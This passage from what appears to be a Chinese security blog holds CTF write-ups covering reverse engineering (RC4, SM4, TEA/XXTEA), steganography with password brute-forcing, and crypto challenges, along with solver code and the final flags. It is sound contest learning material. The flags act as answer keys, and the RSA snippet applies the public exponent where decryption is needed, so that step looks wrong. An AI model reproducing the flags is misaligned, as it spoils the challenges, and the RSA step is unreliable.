有时得用int值好使</span></span><br><span class="line">solver = Solver()</span><br><span class="line">solver.add(m[<span class="number">0</span>] == <span class="built_in">ord</span>(<span class="string">'f'</span>))</span><br><span class="line">solver.add(m[<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">'l'</span>))</span><br><span class="line">solver.add(m[<span class="number">2</span>] == <span class="built_in">ord</span>(<span class="string">'a'</span>))</span><br><span class="line">solver.add(m[<span class="number">3</span>] == <span class="built_in">ord</span>(<span class="string">'g'</span>))</span><br><span class="line">solver.add(m[<span class="number">4</span>] == <span class="built_in">ord</span>(<span class="string">'{'</span>))</span><br><span class="line">solver.add(m[<span class="number">41</span>] == <span class="built_in">ord</span>(<span class="string">'}'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i,tp  <span class="keyword">in</span> <span class="built_in">enumerate</span>(llst):</span><br><span class="line">    solver.add(m[i*<span class="number">6</span> + <span class="number">0</span>] ^ m[i*<span class="number">6</span> + <span class="number">1</span>] ^ m[i*<span class="number">6</span> + <span class="number">2</span>] ^ pad[<span class="number">0</span>] == tp[<span class="number">0</span>])</span><br><span class="line">    solver.add(m[i*<span class="number">6</span> + <span class="number">3</span>] ^ m[i*<span class="number">6</span> + <span class="number">4</span>] ^ pad[<span class="number">1</span>] ^ pad[<span class="number">2</span>] == tp[<span class="number">1</span>])</span><br><span class="line">    solver.add(pad[<span class="number">5</span>] ^ m[i*<span class="number">6</span> + <span class="number">5</span>] ^ pad[<span class="number">1</span>] ^ pad[<span class="number">3</span>] == tp[<span class="number">2</span>])</span><br><span class="line">    solver.add(m[i*<span class="number">6</span> + <span class="number">3</span>] ^ pad[<span class="number">3</span>] ^ pad[<span class="number">4</span>] ^ pad[<span class="number">1</span>] == tp[<span class="number">3</span>])</span><br><span class="line">    solver.add(m[i*<span class="number">6</span> + <span class="number">5</span>] ^ pad[<span class="number">0</span>] ^ m[i*<span class="number">6</span> + <span class="number">4</span>] ^ pad[<span class="number">1</span>] == tp[<span class="number">4</span>])</span><br><span class="line">    solver.add(m[i*<span class="number">6</span> + <span class="number">2</span>] ^ m[i*<span class="number">6</span> + <span class="number">4</span>] ^ pad[<span class="number">0</span>] ^ pad[<span class="number">1</span>] == tp[<span class="number">5</span>])</span><br><span class="line">    solver.add(m[i*<span class="number">6</span> + <span class="number">2</span>] ^ m[i*<span class="number">6</span> + <span class="number">0</span>] ^ m[i*<span class="number">6</span> + <span class="number">4</span>] ^ pad[<span class="number">4</span>] == tp[<span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(solver.check())</span><br><span class="line">res = solver.model()</span><br><span class="line"></span><br><span class="line"><span class="comment"># lst = natsorted([(k, res[k]) for k in res], key=lambda x: x)</span></span><br><span class="line">lst = natsorted([(k, res[k]) <span class="keyword">for</span> k <span class="keyword">in</span> res], <span class="keyword">lambda</span> x: <span class="built_in">str</span>(x[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(v.as_long()), end=<span class="string">''</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023河南省金盾杯WriteUp</title>
      <link href="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/"/>
      <url>/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目质量不错</p><p>打穿逆向区跟杂项区（bushi）</p><p>累死了，我靠，比赛刚结束就得赶高铁去青岛，在高铁上写Wp，我的天，要晕过去的节奏</p><p>嗨嗨嗨  Orz</p><h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><h2 id="RE1-tls-x2F-小花指令-x2F-RC4"><a href="#RE1-tls-x2F-小花指令-x2F-RC4" class="headerlink" title="RE1 - tls/小花指令/RC4"></a>RE1 - tls/小花指令/RC4</h2><p>主要是RC4加密有个tls，不用管</p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206162912166.png" alt="image-20231206162912166"></p><p>主要RC4的call在这儿</p><p>这儿应该算是花指令的一种吧</p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206162953066.png" alt="image-20231206162953066"></p><p>unk_473040是RC4函数的地址</p><p>c一下即可</p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163019542.png" alt="image-20231206163019542"></p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163044222.png" alt="image-20231206163044222"></p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163057446.png" alt="image-20231206163057446"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">__int64  <span class="title function_">RC4_encode</span><span class="params">(<span class="type">unsigned</span> __int8* a1, <span class="type">int</span> a2)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> v3[<span class="number">515</span>] = { <span class="number">0</span> }; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [rsp+80Ch] [rbp+78Ch]</span></span><br><span class="line">    <span class="type">char</span> v5; <span class="comment">// [rsp+813h] [rbp+793h]</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [rsp+814h] [rbp+794h]</span></span><br><span class="line">    <span class="type">int</span> v7; <span class="comment">// [rsp+818h] [rbp+798h]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+81Ch] [rbp+79Ch]</span></span><br><span class="line"></span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i)</span><br><span class="line">    {</span><br><span class="line">        v3[i] = i;</span><br><span class="line">        v3[i + <span class="number">256</span>] = *a1;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; a2; ++j)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i)</span><br><span class="line">            v3[i + <span class="number">256</span>] = a1[j - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i)</span><br><span class="line">        {</span><br><span class="line">            v7 = (v3[i + <span class="number">256</span>] + v7 + v3[i]) % <span class="number">256</span>;</span><br><span class="line">            v4 = v3[v7];</span><br><span class="line">            v3[v7] = v3[i];</span><br><span class="line">            v3[i] = v4;</span><br><span class="line">        }</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; i += <span class="number">2</span>)</span><br><span class="line">        {</span><br><span class="line">            v5 += v3[i];</span><br><span class="line">            v5 ^= v3[i + <span class="number">256</span>];</span><br><span class="line">        }</span><br><span class="line">       <span class="comment">// printf("秘钥流: 0x%x\n", v5&amp;0xff);</span></span><br><span class="line">        a1[j] ^= v5;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">__int64  <span class="title function_">RC4_decode</span><span class="params">(<span class="type">unsigned</span> __int8* a1, <span class="type">int</span> a2)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> v3[<span class="number">515</span>] = { <span class="number">0</span> }; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [rsp+80Ch] [rbp+78Ch]</span></span><br><span class="line">    <span class="type">char</span> v5; <span class="comment">// [rsp+813h] [rbp+793h]</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [rsp+814h] [rbp+794h]</span></span><br><span class="line">    <span class="type">int</span> v7; <span class="comment">// [rsp+818h] [rbp+798h]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+81Ch] [rbp+79Ch]</span></span><br><span class="line"></span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i)</span><br><span class="line">    {</span><br><span class="line">        v3[i] = i;</span><br><span class="line">        v3[i + <span class="number">256</span>] = *a1;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; a2; ++j)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">//用前一个flag值作为秘钥流，单字节爆破</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i)</span><br><span class="line">            v3[i + <span class="number">256</span>] = a1[j - <span class="number">1</span>];</span><br><span class="line">        <span class="comment">//打乱</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i)</span><br><span class="line">        {</span><br><span class="line">            v7 = (v3[i + <span class="number">256</span>] + v7 + v3[i]) % <span class="number">256</span>;</span><br><span class="line">            v4 = v3[v7];</span><br><span class="line">            v3[v7] = v3[i];</span><br><span class="line">            v3[i] = v4;</span><br><span class="line">        }</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; i += <span class="number">2</span>)</span><br><span class="line">        {</span><br><span class="line">            v5 += v3[i];</span><br><span class="line">            v5 ^= v3[i + <span class="number">256</span>];</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"秘钥流: 0x%x\n"</span>, v5 &amp; <span class="number">0xff</span>);</span><br><span class="line">        a1[j] ^= v5;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a1[] =</span><br><span class="line">    {</span><br><span class="line">      <span class="number">0x31</span>, <span class="number">0x5D</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x70</span>, <span class="number">0xCA</span>, <span class="number">0x80</span>, <span class="number">0x42</span>, <span class="number">0x47</span>, <span class="number">0xA8</span>,</span><br><span class="line">      <span class="number">0xA1</span>, <span class="number">0x56</span>, <span class="number">0x19</span>, <span class="number">0x2F</span>, <span class="number">0x2E</span>, <span class="number">0xD9</span>, <span class="number">0x48</span>, <span class="number">0x36</span>, <span class="number">0x03</span>, <span class="number">0x52</span>,</span><br><span class="line">      <span class="number">0x03</span>, <span class="number">0xB2</span>, <span class="number">0x63</span>, <span class="number">0x42</span>, <span class="number">0x5B</span>, <span class="number">0xD8</span>, <span class="number">0x32</span>, <span class="number">0x07</span>, <span class="number">0x73</span>, <span class="number">0x6E</span>,</span><br><span class="line">      <span class="number">0x88</span>, <span class="number">0xF5</span>, <span class="number">0x0D</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xBA</span>, <span class="number">0x0D</span></span><br><span class="line">    };</span><br><span class="line">    </span><br><span class="line">    RC4_encode(a1,<span class="number">32</span>);</span><br><span class="line">    <span class="comment">//加密之后</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> crypto_flag[] =</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">//c</span></span><br><span class="line">      <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x31</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x30</span>, <span class="number">0x63</span>, <span class="number">0x37</span>, <span class="number">0x64</span>,</span><br><span class="line">      <span class="number">0x37</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x30</span>, <span class="number">0x32</span>,</span><br><span class="line">      <span class="number">0x39</span>, <span class="number">0x36</span>, <span class="number">0x30</span>, <span class="number">0x38</span>, <span class="number">0x35</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x39</span>, <span class="number">0x63</span>, <span class="number">0x65</span>,</span><br><span class="line">      <span class="number">0x38</span>, <span class="number">0x33</span></span><br><span class="line">    };</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> crypto[] = { <span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0xbd</span>,<span class="number">0x54</span>,<span class="number">0xa3</span>,<span class="number">0x8c</span>,<span class="number">0x75</span>,<span class="number">0xd2</span>,<span class="number">0x17</span>,<span class="number">0x6c</span>,<span class="number">0xd4</span>,<span class="number">0xc2</span>,<span class="number">0xf</span>,<span class="number">0x75</span>,<span class="number">0x1</span>,<span class="number">0x28</span>,<span class="number">0xe</span>,<span class="number">0xe3</span>,<span class="number">0x14</span>,<span class="number">0x38</span>,<span class="number">0x98</span>,<span class="number">0xcd</span>,<span class="number">0x53</span>,<span class="number">0x3b</span>,<span class="number">0x29</span>,<span class="number">0xad</span>,<span class="number">0xb2</span>,<span class="number">0x0</span>,<span class="number">0x4c</span>,<span class="number">0x0</span>,<span class="number">0xa8</span>,<span class="number">0x6b</span> };</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mm = <span class="number">32</span>;</span><br><span class="line">    <span class="comment">//RC4_decode(crypto_flag, mm);</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; mm; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0x%x,"</span>, crypto_flag[i]);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, crypto_flag[i]);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163136721.png" alt="image-20231206163136721"></p><p>flag{ca1acd0c7d7111eeaf0296085339ce83}</p><h2 id="Android-SM4-x2F-so动调"><a href="#Android-SM4-x2F-so动调" class="headerlink" title="Android -SM4/so动调"></a>Android -SM4/so动调</h2><p>发现是SM4标准加密</p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/wps1.jpg" alt="img"> </p><p>包名</p><p>com.moible.midand</p><p>so名</p><p>lib  midand</p><p>寻找方法：</p><p>readResourceFileBytes</p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/wps2.jpg" alt="img"></p><p>要解密的密文：</p><p>73 1e 13 3e f7 6a 5c d1 ef 96 26 a9 94 7c f4 a4 6c e2 37 b7 d 49 5 e9 21 e3 5e 2e 7d 7a 1a 74</p><p>这是两串秘钥，分别解密</p><p>C4 83 84 72 B8 E1 60 BA 5D 99 5A 6B E3 67 40 17 </p><p>7C 3F 33 21 91 1C FA 54 8F 35 30 73 DD 2B 80 A7</p><p>分别解密（解密两次）</p><p>两部分的flag</p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163929564.png" alt="image-20231206163929564"></p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163943947.png" alt="image-20231206163943947"></p><p>flag{fad1c7e27ec411eebe3a3e4419a1b3cc}</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="来都来了-伪加密"><a href="#来都来了-伪加密" class="headerlink" title="来都来了 - 伪加密"></a>来都来了 - 伪加密</h2><p>伪加密使用java -jar ZipCenOp.jar r 压缩包</p><p>打开的字符base64解密</p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163249023.png" alt="image-20231206163249023"></p><h2 id="芙宁娜-pyc隐写-x3D-stegosaurus"><a href="#芙宁娜-pyc隐写-x3D-stegosaurus" class="headerlink" title="芙宁娜 - pyc隐写=stegosaurus"></a>芙宁娜 - pyc隐写=stegosaurus</h2><p>图片上的base64解码差5位</p><p>ZmxhZ3tiYzgzOTRhYS03ZTMyLTQ3ZTgtYTlmZC0xYmY2ODNhZg==</p><p>flag{bc8394aa-7e32-47e8-a9fd-1bf683af </p><p>010可以找到图片下方盖住的16进制hex-&gt;string</p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163350007.png" alt="image-20231206163350007"></p><p>发现可能是python代码，将所有16进制代码取出来重组成pyc文件，stegosaurus-master pyc隐写得出剩下的几位</p><p>8e8f}</p><p>flag{bc8394aa-7e32-47e8-a9fd-1bf683af8e8f}</p><h2 id="honor-steghide隐写"><a href="#honor-steghide隐写" class="headerlink" title="honor - steghide隐写"></a>honor - steghide隐写</h2><p>binwalk发现藏了张jpg图片</p><p>foremost 分离出来</p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163448985.png" alt="image-20231206163448985"></p><p>steghide隐写</p><p>stegseek暴破密码</p><p>解题步骤如下</p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163507103.png" alt="image-20231206163507103"></p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163521405.png" alt="image-20231206163521405"></p><p>解出来  工具梭</p><p>fence密码</p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163538316.png" alt="image-20231206163538316"></p><p>flag{c58496-706a3-4e-6cb7e6l6cbc2e4700693a}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="hakiehs"><a href="#hakiehs" class="headerlink" title="hakiehs"></a>hakiehs</h2><p>塞尔达传说（Pi）</p><p>塞尔达文字</p><p>席卡古文</p><p>格鲁德文</p><p>海利亚文</p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163646781.png" alt="image-20231206163646781"></p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163657748.png" alt="image-20231206163657748"></p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163709160.png" alt="image-20231206163709160"></p><p>flag{linkzeldaganon}</p><h2 id="我看看谁还不会RSA"><a href="#我看看谁还不会RSA" class="headerlink" title="我看看谁还不会RSA"></a>我看看谁还不会RSA</h2><p>RSA =.=</p><p><img src="/2023/12/06/2023%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E6%9D%AFWriteUp/image-20231206163751601.png" alt="image-20231206163751601"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">c=<span class="number">8232151627233115772131180151146951323147507324390914513031444555762539986162650</span></span><br><span class="line">e=<span class="number">37777</span></span><br><span class="line">p=<span class="number">8666789885346075954502743436174521501697</span></span><br><span class="line">q=<span class="number">2449101960789395782044494299423558347143</span></span><br><span class="line"></span><br><span class="line">m = gmpy2.powmod(c, e, p * q)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b'flag{r5a_Who_w0nt}'</span></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023山东省职业技能大赛WriteUp</title>
      <link href="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/"/>
      <url>/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>啦啦啦啦啦啦啦~ 打完脑子宕机了</p><p>打穿逆向跟杂项 =。=</p><p>（杂项差个IC卡破解，真没时间看了）</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/image-20231114180049579.png" alt="image-20231114180049579"></p><h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>base64解密</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/8.png" alt="img">flag{12246231b2e4b2544ff2f4ec36f343e9}</p><h2 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h2><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/10.png" alt="img"></p><h2 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h2><p>jadx打开，看到密文AES-ECB解密即可注意有个\n，把他去掉</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/9.png" alt="img"> </p><h2 id="GORC"><a href="#GORC" class="headerlink" title="GORC"></a>GORC</h2><p>密文提取+key</p><p>RC4解密</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/image-20231115145948343.png" alt="image-20231115145948343"></p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps1.jpg" alt="img"> </p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps2.jpg" alt="img"> </p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps3.jpg" alt="img"> </p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps4.jpg" alt="img"> </p><h2 id="XXTEA-rust"><a href="#XXTEA-rust" class="headerlink" title="XXTEA - rust"></a>XXTEA - rust</h2><p>rust逆向</p><p>居然输入flag，输出flag</p><p>替换密文为加密之后的密文不就可以解密了？</p><p>找到解密函数开搞</p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps5.jpg" alt="img"> </p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps6.jpg" alt="img"> </p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps7.jpg" alt="img"> </p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps8.jpg" alt="img"> </p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps9.jpg" alt="img"> </p><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/wps10.jpg" alt="img"> </p><p><img 